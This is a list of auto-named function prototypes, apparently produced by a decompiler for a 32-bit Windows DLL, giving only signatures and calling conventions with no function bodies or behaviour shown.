_DWORD *__thiscall sub_100341CD(void **this, _DWORD *a2);
void __thiscall __noreturn sub_10034211(void *this);
void __thiscall sub_1003422D(_DWORD *this);
BOOL __thiscall sub_10034252(void *this);
int __thiscall sub_10034264(int this, int a2);
int __thiscall sub_10034295(int this, int a2);
_DWORD *__thiscall sub_100342C6(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10034317(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10034336(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10034356(void *this, _DWORD *a2);
BOOL __thiscall sub_10034393(int this);
BOOL __thiscall sub_100343A6(_DWORD *this);
int __thiscall sub_100343B0(int this);
void __thiscall sub_100343DE(_DWORD *this);
void __thiscall sub_100343E2(_DWORD *this);
void __noreturn sub_100343E6(); // weak
void __noreturn sub_10034403(); // weak
_DWORD *__thiscall sub_10034427(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10034447(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10034467(_DWORD *a1);
void __thiscall sub_100344B4(_DWORD *this);
bool __thiscall sub_100344FF(_DWORD *this, _DWORD *a2);
char __thiscall sub_10034539(_DWORD *this, _DWORD *a2);
int __thiscall sub_10034588(_DWORD *this, _DWORD *a2);
int __thiscall sub_100345E0(_DWORD *this, _DWORD *pExceptionObject);
_DWORD *__thiscall sub_10034635(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10034666(_DWORD *this, _DWORD *a2);
int __thiscall sub_10034697(_DWORD *this, int a2);
int __thiscall sub_100346B2(_DWORD *this);
int __thiscall sub_100346C6(_DWORD *this);
_DWORD *__stdcall sub_100346CE(_DWORD *a1);
void __thiscall sub_100346FA(_DWORD *this);
int __thiscall sub_10034721(_DWORD *this);
BOOL __thiscall sub_1003472D(_DWORD *this, int a2);
int __thiscall sub_10034759(_DWORD *this);
int __thiscall sub_10034765(_DWORD *this, int a2);
int __thiscall sub_10034796(_DWORD *this, int a2);
int __thiscall sub_100347C7(_DWORD *this);
int __thiscall sub_100347D3(_DWORD *this);
int __thiscall sub_100347DB(_DWORD *this);
// _DWORD *__userpurge sub_100347E3@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10034822(void *this);
_DWORD *__thiscall sub_1003484D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003486C(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1003488B(_DWORD *a1);
// int __userpurge sub_100348CE@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// void __usercall sub_1003494F(int a1@<esi>);
_DWORD *__stdcall sub_10034977(_DWORD *a1);
_DWORD *__stdcall sub_100349A2(_DWORD *a1, int pExceptionObject, int a3);
int *__thiscall sub_10034A28(int *Block, char a2);
_DWORD *__stdcall sub_10034A47(_DWORD *a1, int a2);
LONG __thiscall sub_10034AAA(int *this);
// BOOL __usercall sub_10034ADF@<eax>(int a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_10034B33(int a1, _DWORD *a2);
_DWORD *__stdcall sub_10034B68(int a1, _DWORD *a2);
int __thiscall sub_10034B9D(void *this, int a2);
int __thiscall sub_10034BEB(void *this);
_DWORD *__thiscall sub_10034CBF(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10034D51(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10034DE4(void *this, _DWORD *a2);
LONG __thiscall sub_10034EA8(void *this, int a2);
LONG __thiscall sub_10034F11(void *this, int a2);
LONG __thiscall sub_10034F7A(void *this, int a2);
LONG __thiscall sub_10034FE3(void *this, int a2);
int __thiscall sub_1003504E(void *this);
_DWORD *__thiscall sub_1003509F(_DWORD *Block, char a2);
int __stdcall sub_100350CE(int a1, int a2);
_DWORD *__thiscall sub_1003510E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10035135(_DWORD *this, _DWORD *a2);
int __stdcall sub_100351A1(int a1, int a2);
_DWORD *__thiscall sub_100351EC(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10035213(int *this, _DWORD *a2);
// int __userpurge sub_1003535C@<eax>(int a1@<edi>, int a2);
_DWORD *__stdcall sub_10035420(_DWORD *a1, int a2, int a3, int a4);
_DWORD *__stdcall sub_10035466(_DWORD *a1, int a2);
_DWORD *__stdcall sub_100354A1(int a1, _DWORD *a2);
LONG __thiscall sub_100354D6(int *this, int a2, int a3);
_DWORD *__stdcall sub_1003551D(_DWORD *a1, int a2);
_BYTE *__thiscall sub_10035557(_BYTE *Block, char a2);
int __thiscall sub_10035576(_BYTE *this);
int __thiscall sub_100355B8(void *this, int a2);
int __thiscall sub_100355DD(void *this, _DWORD *a2);
int __thiscall sub_10035602(_DWORD *this);
char sub_10035606();
_DWORD *__stdcall sub_10035609(_DWORD *a1, int a2);
_BYTE *__thiscall sub_10035643(_BYTE *Block, char a2);
void __thiscall sub_10035662(_BYTE *this);
int __thiscall sub_100356A4(void *this, char *a2);
int __thiscall sub_100356D6(void *this, int *a2);
int __thiscall sub_10035729(void *this);
int __thiscall sub_10035735(_DWORD *this);
char sub_10035739();
int __fastcall sub_1003573C(_DWORD *a1);
int __thiscall sub_1003575C(_DWORD *this, int a2);
unsigned int sub_10035780();
unsigned int sub_100357B0();
unsigned int sub_100357DB();
unsigned int sub_10035800();
int sub_1003581B();
int *sub_10035876();
// _DWORD *__usercall sub_100358B9@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
int sub_10035932();
void sub_1003596C();
// int __usercall sub_10035989@<eax>(size_t a1@<esi>);
unsigned int sub_100359A9();
unsigned int sub_100359FB();
// int __usercall sub_10035B40@<eax>(int a1@<edi>);
// int __usercall sub_10035BD5@<eax>(int a1@<eax>);
int sub_10035C2D();
// _DWORD *__usercall sub_10035C66@<eax>(int a1@<eax>, _DWORD *a2@<edx>, int a3);
// _DWORD *__usercall sub_10035C91@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
// _DWORD *__usercall sub_10035CE3@<eax>(int a1@<eax>, int a2@<edx>, _DWORD *a3@<esi>);
// int *__usercall sub_10035D52@<eax>(int a1@<eax>, _DWORD *a2@<ecx>);
// _DWORD *__usercall sub_10035D7B@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_10035DAD@<eax>(_DWORD *a1@<edi>, int a2);
int *sub_10035E3E();
// int __usercall sub_10035EFB@<eax>(int result@<eax>);
void *sub_10035F46();
// char *__userpurge sub_10036031@<eax>(int a1@<eax>, int a2);
// _BYTE *__userpurge sub_100361E4@<eax>(int a1@<ebx>, unsigned __int8 *a2@<edi>, int a3);
unsigned __int8 *__thiscall sub_10036274(unsigned __int8 *this, int a2);
_DWORD *__thiscall sub_100363D8(_DWORD *this, int a2);
char *__cdecl sub_10036481(unsigned __int8 *a1, unsigned __int8 *a2, int a3);
// int __usercall sub_10036600@<eax>(int a1@<eax>, int a2@<ecx>);
// char __usercall sub_10036736@<al>(unsigned __int8 *a1@<edi>);
// unsigned __int8 *__userpurge sub_100368FB@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 *i@<ecx>, int a3);
char *__cdecl sub_10036A47(unsigned __int8 *a1);
int __thiscall sub_10036D07(int this, int a2);
// int __usercall sub_10036DF6@<eax>(int a1@<eax>);
// char __usercall sub_10036EE0@<al>(int a1@<eax>, int a2@<ecx>);
// char __userpurge sub_10036F2B@<al>(unsigned __int8 *a1@<eax>, int a2);
// char __usercall sub_10037020@<al>(unsigned __int8 *a1@<eax>);
// int __usercall sub_1003710C@<eax>(int a1@<eax>, int a2@<ecx>);
int *__thiscall sub_1003713A(unsigned __int8 *this);
// char __userpurge sub_100371E0@<al>(unsigned __int8 *a1@<ebx>, int a2);
// int *__usercall sub_100372B2@<eax>(unsigned __int8 *a1@<eax>);
void *sub_100373B6();
unsigned int __stdcall sub_100373D2(_DWORD *a1, _DWORD *a2);
char __stdcall sub_10037551(_DWORD *a1, _DWORD *a2);
_DWORD *__stdcall sub_100376F3(_DWORD *a1);
void __thiscall sub_10037721(_DWORD *this);
_DWORD *__stdcall sub_10037745(_DWORD *a1);
void __thiscall sub_10037772(_DWORD *this);
_DWORD *__stdcall sub_10037796(_DWORD *a1);
void __thiscall sub_100377C3(_DWORD *this);
_DWORD *__stdcall sub_100377E7(_DWORD *a1);
void __thiscall sub_10037814(_DWORD *this);
_DWORD *__stdcall sub_10037838(_DWORD *a1);
void __thiscall sub_10037865(_DWORD *this);
_DWORD *__stdcall sub_10037889(_DWORD *a1);
void __thiscall sub_100378B6(_DWORD *this);
_DWORD *__stdcall sub_100378DA(_DWORD *a1);
void __thiscall sub_10037907(_DWORD *this);
_DWORD *__stdcall sub_1003792B(_DWORD *a1, int a2);
int *__thiscall sub_10037992(int *Block, char a2);
// _DWORD *__userpurge sub_100379B1@<eax>(int a1@<ebx>, _DWORD *a2);
LONG __thiscall sub_10037A12(int *this);
_DWORD *__thiscall sub_10037AB1(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10037AE4(void *this, _DWORD *a2);
_DWORD *__stdcall sub_10037B17(_DWORD *a1);
int *__thiscall sub_10037B5A(int *Block, char a2);
// _DWORD *__userpurge sub_10037B79@<eax>(int a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10037BCC(_DWORD *a1, int a2, int a3, int a4);
LONG __thiscall sub_10037C1D(int *this);
// _DWORD *__usercall sub_10037C52@<eax>(_DWORD *a1@<eax>);
_DWORD *__thiscall sub_10037C73(_DWORD *this, _DWORD *a2);
// unsigned int __usercall sub_10037D10@<eax>(_DWORD *a1@<edi>);
// int *__usercall sub_10037D3D@<eax>(int *a1@<ebx>, int *a2@<esi>);
// bool __usercall sub_10037D68@<al>(int a1@<edi>, int a2@<esi>);
// __int64 __usercall sub_10037DA8@<edx:eax>(__int64 result@<edx:eax>);
// __int64 __usercall sub_10037E08@<edx:eax>(__int64 result@<edx:eax>);
// int __usercall sub_10037E66@<eax>(int result@<eax>, int a2@<edi>, int a3);
// int __usercall sub_10037F16@<eax>(int *a1@<eax>, _DWORD *a2@<edx>);
// unsigned int __usercall sub_100380D3@<eax>(int a1@<edx>, int a2@<esi>, int a3);
// unsigned int __usercall sub_1003814A@<eax>(_DWORD *a1@<ebx>, int *a2);
// int __usercall sub_10038332@<eax>(int result@<eax>, int a2@<ecx>, _WORD *a3);
// int __usercall sub_100383EE@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_10038888@<eax>(int a1@<eax>);
// int __usercall sub_100388E9@<eax>(int a1@<eax>, int a2, int a3, int a4);
// _DWORD *__usercall sub_10038B1F@<eax>(int a1@<eax>, int a2@<ecx>, _BYTE *a3, int a4);
// int __usercall sub_10038B9F@<eax>(int a1@<eax>);
// int __usercall sub_10038D62@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<edi>, _BYTE *a4);
// int __usercall sub_10038FD1@<eax>(int result@<eax>, int a2, int a3);
int __fastcall sub_10039383(int a1, _WORD *a2);
unsigned int __cdecl sub_100393C5(unsigned int a1, int a2);
// int __usercall sub_100393E4@<eax>(int result@<eax>);
// int __usercall sub_10039451@<eax>(int result@<eax>);
// _DWORD *__usercall sub_100394A8@<eax>(int a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>);
// int __usercall sub_10039510@<eax>(unsigned int a1@<eax>, unsigned __int8 *a2@<ecx>, unsigned int a3);
// int __usercall sub_100397A2@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3);
int __fastcall sub_10039C80(unsigned int a1, _DWORD *a2);
// int __usercall sub_10039C95@<eax>(int *a1@<eax>, char *a2);
void *__cdecl sub_10039D7C(int a1, int a2, int a3);
void __cdecl sub_10039D8F(int a1, void *Block);
int __cdecl sub_10039E1C(unsigned int a1);
_DWORD *__stdcall sub_10039E34(_DWORD *a1);
_DWORD *__thiscall sub_10039E62(_DWORD *Block, char a2);
void __thiscall sub_10039E81(_DWORD *this);
_DWORD *__stdcall sub_10039EA5(_DWORD *a1);
_DWORD *__thiscall sub_10039ED3(_DWORD *Block, char a2);
void __thiscall sub_10039EF2(_DWORD *this);
_DWORD *__stdcall sub_10039F16(_DWORD *a1);
int __thiscall sub_10039F39(_DWORD *this);
_DWORD *__stdcall sub_10039F4F(_DWORD *a1);
int __thiscall sub_10039FBC(_DWORD *this);
int __thiscall sub_1003A011(_DWORD *this);
void __fastcall sub_1003A015(_DWORD *a1, int a2);
int *__thiscall sub_1003A382(int *Block, char a2);
LONG __thiscall sub_1003A3A1(int *this);
_DWORD *__stdcall sub_1003A409(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003A43E(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003A473(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003A4A8(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003A4DD(int a1, _DWORD *a2);
_DWORD *__stdcall sub_1003A53C(int pExceptionObject, _DWORD *a2);
_DWORD *__thiscall sub_1003A58D(void *this, _DWORD *a2, int a3, int a4);
int *__thiscall sub_1003A5D3(int *Block, char a2);
LONG __thiscall sub_1003A5F2(int *this);
_DWORD *__stdcall sub_1003A630(int a1, _DWORD *a2);
_DWORD *__thiscall sub_1003A669(void *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int *a8, int *a9, int a10, int a11, int a12, int a13, int a14, int a15);
int *__thiscall sub_1003A70C(int *Block, char a2);
LONG __thiscall sub_1003A72B(int *this);
_DWORD *__thiscall sub_1003A74F(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003A764(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1003A779(_DWORD *this, _DWORD *a2);
// int __usercall sub_1003A78E@<eax>(int result@<eax>);
_DWORD *__thiscall sub_1003A7A6(_DWORD *Block, char a2);
// int __userpurge sub_1003A7CD@<eax>(int result@<eax>, int a2@<ecx>, int a3, char a4, int a5, int a6, char a7);
int __thiscall sub_1003A826(int this, int a2);
int __thiscall sub_1003A85A(_DWORD *this);
int __thiscall sub_1003A85E(_DWORD *this);
int __thiscall sub_1003A862(_DWORD *this);
char __thiscall sub_1003A866(_BYTE *this);
int __thiscall sub_1003A86A(_BYTE *this);
_DWORD *__thiscall sub_1003A872(int this, _DWORD *a2);
_DWORD *__thiscall sub_1003A9E6(int this, _DWORD *a2);
char __thiscall sub_1003AB27(_ThrowInfo *this);
_DWORD *__cdecl sub_1003ACD6(_DWORD *a1);
int __stdcall sub_1003ADC0(int a1);
// _DWORD *__userpurge sub_1003ADF0@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
// int __userpurge sub_1003AE32@<eax>(_DWORD *a1@<esi>, int a2);
int __stdcall sub_1003AEA6(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8);
int *__thiscall sub_1003AF22(int *Block, char a2);
LONG __thiscall sub_1003AF41(int *this);
_DWORD *__thiscall sub_1003AF83(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003AFB5(void *this, _DWORD *a2);
int __thiscall sub_1003AFE7(_DWORD *this);
int __thiscall sub_1003AFEB(_DWORD *this);
char __thiscall sub_1003AFEF(_BYTE *this);
_DWORD *__thiscall sub_1003AFFA(_DWORD *Block, char a2);
_DWORD *__stdcall sub_1003B021(_DWORD *a1);
HANDLE sub_1003B054();
int __thiscall sub_1003B062(void *this);
int *__thiscall sub_1003B067(int *Block, char a2);
LONG __stdcall sub_1003B084(int *a1);
_DWORD *__stdcall sub_1003B0BA(_DWORD *a1, int a2);
int *__thiscall sub_1003B0FD(int *Block, char a2);
LONG __thiscall sub_1003B119(int *this);
int __thiscall sub_1003B154(int this);
// int __usercall sub_1003B276@<eax>(int a1@<eax>);
// BOOL __usercall sub_1003B27E@<eax>(int a1@<eax>);
// int __usercall sub_1003B28D@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_1003B2CE@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1003B30E(void *this);
// _DWORD *__usercall sub_1003B35A@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
// void __usercall sub_1003B3A4(int a1@<esi>);
int __stdcall sub_1003B3E2(int a1, _ThrowInfo *a2);
_DWORD *__thiscall sub_1003B54D(_DWORD *Block, char a2);
void *__thiscall sub_1003B569(_DWORD *this);
void *__stdcall sub_1003B5E7(int a1);
void __stdcall sub_1003B6DC(int a1, int *a2, int a3);
// void *__usercall sub_1003B87D@<eax>(int a1@<edi>);
void *__thiscall sub_1003B954(_DWORD *this);
// int __usercall sub_1003B9E0@<eax>(_DWORD *a1@<eax>);
bool __thiscall sub_1003BA03(_DWORD **this);
int *__stdcall sub_1003BC84(unsigned int *pExceptionObject, int *a2);
void __thiscall sub_1003BD98(int this, int *a2, int a3);
int __thiscall sub_1003BE49(int this, int a2);
int __thiscall sub_1003BE7F(int this, int a2);
_DWORD *__thiscall sub_1003BEB5(void *this, _DWORD *a2);
void *__thiscall sub_1003BF0F(_DWORD *this);
BOOL __thiscall sub_1003BF39(void *this);
_DWORD *__thiscall sub_1003BF59(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003BFB6(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C013(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C078(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C0DD(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1003C15C(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1003C1DB(_DWORD *this);
int *__thiscall sub_1003C205(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1003C278(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1003C2EB(void *this, int a2);
void __thiscall sub_1003C329(void *this, int a2, int a3);
void __thiscall sub_1003C36A(void *this, int a2);
int __thiscall sub_1003C3A8(void *this, int a2);
int __thiscall sub_1003C3EC(void *this, int a2);
void __thiscall sub_1003C430(void *this);
_DWORD *__thiscall sub_1003C47E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C4DB(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C538(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C59D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003C602(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1003C681(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1003C700(_DWORD *this);
int *__thiscall sub_1003C72A(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1003C79D(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1003C810(void *this, int a2);
void __thiscall sub_1003C84E(void *this, int a2, int a3);
void __thiscall sub_1003C88F(void *this, int a2);
int __thiscall sub_1003C8CD(void *this, int a2);
int __thiscall sub_1003C911(void *this, int a2);
void __thiscall sub_1003C955(void *this);
_DWORD *__thiscall sub_1003C9A3(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003CA00(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003CA5D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003CAC2(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003CB27(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1003CBA6(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1003CC25(_DWORD *this);
int *__thiscall sub_1003CC4F(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1003CCC2(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1003CD35(void *this, int a2);
void __thiscall sub_1003CD73(void *this, int a2, int a3);
void __thiscall sub_1003CDB4(void *this, int a2);
int __thiscall sub_1003CDF2(void *this, int a2);
int __thiscall sub_1003CE36(void *this, int a2);
void __thiscall sub_1003CE7A(void *this);
// HRESULT __usercall sub_1003CEFE@<eax>(void *a1@<ecx>, _DWORD *a2@<edi>);
_DWORD *__thiscall sub_1003CF61(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003CFBE(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D01B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D080(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D0E5(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1003D164(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1003D1E3(_DWORD *this);
int *__thiscall sub_1003D20D(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1003D280(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1003D2F3(void *this, int a2);
void __thiscall sub_1003D331(void *this, int a2, int a3);
void __thiscall sub_1003D372(void *this, int a2);
int __thiscall sub_1003D3B0(void *this, int a2);
int __thiscall sub_1003D3F4(void *this, int a2);
void __thiscall sub_1003D438(void *this);
_DWORD *__thiscall sub_1003D48D(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D4EA(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D547(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D5AC(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1003D611(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1003D690(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_1003D70F(_DWORD *this);
int *__thiscall sub_1003D739(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1003D7AC(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1003D81F(void *this, int a2);
void __thiscall sub_1003D85D(void *this, int a2, int a3);
void __thiscall sub_1003D89E(void *this, int a2);
int __thiscall sub_1003D8DC(void *this, int a2);
int __thiscall sub_1003D920(void *this, int a2);
void __thiscall sub_1003D964(void *this);
_DWORD *__thiscall sub_1003D9B9(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003DA2C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003DA65(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003DA9E(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003DAF4(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003DB4A(_DWORD *Block, char a2);
// int __usercall sub_1003DBB2@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DBE8@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1003DC19(void *this, int a2);
// int __usercall sub_1003DC51@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_1003DC8C(void *this, int a2);
// int __usercall sub_1003DCC4@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DD04@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DD44@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DD9A@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DDDA@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DE10@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1003DE50@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__stdcall sub_1003DE81(_DWORD *a1, int a2);
BOOL __thiscall sub_1003DECB(int this);
BOOL __thiscall sub_1003DEDE(_DWORD *this);
_DWORD *__thiscall sub_1003DEE8(_DWORD *this);
void __thiscall sub_1003DF1C(_DWORD *this);
void __thiscall sub_1003DF20(_DWORD *this);
void __noreturn sub_1003DF24(); // weak
void __noreturn sub_1003DF41(); // weak
void __thiscall sub_1003DF5E(_DWORD *this);
_DWORD *__thiscall sub_1003DF8A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003DFC2(_DWORD *this);
bool __thiscall sub_1003DFEC(int this);
BOOL __thiscall sub_1003E003(_DWORD *this);
int __thiscall sub_1003E00D(int this);
int __thiscall sub_1003E048(int this);
int __thiscall sub_1003E07E(_DWORD *this);
int __thiscall sub_1003E0A6(int this);
int __thiscall sub_1003E0E1(int this, int a2);
_DWORD *__thiscall sub_1003E0FA(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E132(_DWORD *this);
bool __thiscall sub_1003E15C(int this);
BOOL __thiscall sub_1003E173(_DWORD *this);
int __thiscall sub_1003E17D(int this);
int __thiscall sub_1003E1B8(int this);
int __thiscall sub_1003E1EE(_DWORD *this);
int __thiscall sub_1003E216(int this);
int __thiscall sub_1003E251(int this, int a2);
_DWORD *__thiscall sub_1003E26A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E2A2(_DWORD *this);
bool __thiscall sub_1003E2CC(int this);
BOOL __thiscall sub_1003E2E3(_DWORD *this);
int __thiscall sub_1003E2ED(int this);
int __thiscall sub_1003E328(int this);
int __thiscall sub_1003E35E(_DWORD *this);
int __thiscall sub_1003E386(int this);
int __thiscall sub_1003E3C1(int this, int a2);
_DWORD *__thiscall sub_1003E3DA(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E412(_DWORD *this);
bool __thiscall sub_1003E43C(int this);
BOOL __thiscall sub_1003E453(_DWORD *this);
int __thiscall sub_1003E45D(int this);
int __thiscall sub_1003E498(int this);
int __thiscall sub_1003E4CE(_DWORD *this);
int __thiscall sub_1003E4F6(int this);
int __thiscall sub_1003E531(int this, int a2);
_DWORD *__thiscall sub_1003E54A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E582(_DWORD *this);
bool __thiscall sub_1003E5AC(int this);
BOOL __thiscall sub_1003E5C3(_DWORD *this);
int __thiscall sub_1003E5CD(int this);
int __thiscall sub_1003E608(int this);
int __thiscall sub_1003E63E(_DWORD *this);
int __thiscall sub_1003E666(int this);
int __thiscall sub_1003E6A1(int this, int a2);
_DWORD *__thiscall sub_1003E6BA(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E6F2(_DWORD *this);
bool __thiscall sub_1003E71C(int this);
BOOL __thiscall sub_1003E733(_DWORD *this);
int __thiscall sub_1003E73D(int this);
int __thiscall sub_1003E778(int this);
int __thiscall sub_1003E7AE(_DWORD *this);
int __thiscall sub_1003E7D6(int this);
int __thiscall sub_1003E811(int this, int a2);
_DWORD *__thiscall sub_1003E82A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E862(_DWORD *this);
bool __thiscall sub_1003E88C(int this);
BOOL __thiscall sub_1003E8A3(_DWORD *this);
int __thiscall sub_1003E8AD(int this);
int __thiscall sub_1003E8E8(int this);
int __thiscall sub_1003E91E(_DWORD *this);
int __thiscall sub_1003E946(int this);
int __thiscall sub_1003E981(int this, int a2);
_DWORD *__thiscall sub_1003E99A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003E9D2(_DWORD *this);
bool __thiscall sub_1003E9FC(int this);
BOOL __thiscall sub_1003EA13(_DWORD *this);
int __thiscall sub_1003EA1D(int this);
int __thiscall sub_1003EA58(int this);
int __thiscall sub_1003EA8E(_DWORD *this);
int __thiscall sub_1003EAB6(int this);
int __thiscall sub_1003EAF1(int this, int a2);
_DWORD *__thiscall sub_1003EB0A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003EB42(_DWORD *this);
bool __thiscall sub_1003EB6C(int this);
BOOL __thiscall sub_1003EB83(_DWORD *this);
int __thiscall sub_1003EB8D(int this);
int __thiscall sub_1003EBC8(int this);
int __thiscall sub_1003EBFE(_DWORD *this);
int __thiscall sub_1003EC26(int this);
int __thiscall sub_1003EC61(int this, int a2);
_DWORD *__thiscall sub_1003EC7A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_1003ECB2(_DWORD *this);
bool __thiscall sub_1003ECDC(int this);
BOOL __thiscall sub_1003ECF3(_DWORD *this);
int __thiscall sub_1003ECFD(int this);
int __thiscall sub_1003ED38(int this);
int __thiscall sub_1003ED6E(_DWORD *this);
int __thiscall sub_1003ED96(int this);
int __thiscall sub_1003EDD1(int this, int a2);
_DWORD *__thiscall sub_1003EDEA(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE07(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE23(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE3F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE5B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE77(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EE93(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EEAF(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EECB(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EEE7(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EF03(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1003EF1F(_DWORD *Block, char a2);
void __stdcall sub_1003EF3B(_DWORD *a1);
_DWORD *__stdcall sub_1003EFF0(_DWORD *a1);
// char __usercall sub_1003F02A@<al>(int a1@<eax>, int a2@<ecx>);
// _DWORD *__userpurge sub_1003F06B@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1003F0AF(void *this);
// _DWORD *__usercall sub_1003F10C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
void **__thiscall sub_1003F13C(void **this, void **a2);
void *__thiscall sub_1003F17B(int this);
int __thiscall sub_1003F1D9(_DWORD *this);
int __thiscall sub_1003F1DD(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_1003F238(int *this, int a2);
int __thiscall sub_1003F250(_DWORD *this, unsigned int a2);
int __thiscall sub_1003F299(_DWORD *this, int a2);
int __thiscall sub_1003F2B7(_DWORD *this, int a2);
void __thiscall sub_1003F2D5(_DWORD *this, unsigned int a2);
int __thiscall sub_1003F2F7(void **this);
BOOL __thiscall sub_1003F31B(void *this);
int __thiscall sub_1003F326(_DWORD *this, unsigned int a2);
